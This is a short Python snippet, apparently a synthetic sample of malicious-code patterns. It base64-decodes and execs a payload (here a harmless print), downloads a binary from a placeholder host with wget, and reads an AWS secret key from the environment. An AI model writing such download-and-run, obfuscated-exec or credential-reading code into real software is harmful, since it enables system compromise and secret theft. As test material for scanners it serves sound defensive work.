import base64
import os
import subprocess

payload = base64.b64decode("cHJpbnQoJ2hpJyk=")
subprocess.run(["wget", "https://example.com/bin", "-O", "bin.exe"])
token = os.environ.get("AWS_SECRET_ACCESS_KEY")
exec(payload)
